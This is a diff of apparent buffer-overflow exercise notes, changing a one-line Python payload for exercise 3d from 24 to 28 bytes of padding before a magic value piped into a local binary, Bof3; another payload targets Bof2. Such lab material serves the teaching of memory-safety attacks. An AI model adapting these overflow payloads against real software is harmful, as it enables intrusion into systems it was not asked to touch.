@@ -19,7 +19,7 @@ fputs() --- The newer version of puts(). No new line.
 `python -c 'print 10*"A" + "\xbe\xba\xfe\xca"' |./Bof2`
 
 ## Exercise 3d
-`python -c 'print 24*"A" +  "\xef\xbe\xad\xde"' | ./Bof3`
+`python -c 'print 28*"A" +  "\xef\xbe\xad\xde"' | ./Bof3`
 
 # Instruction pointer, Pro
 ## Exercise 3e
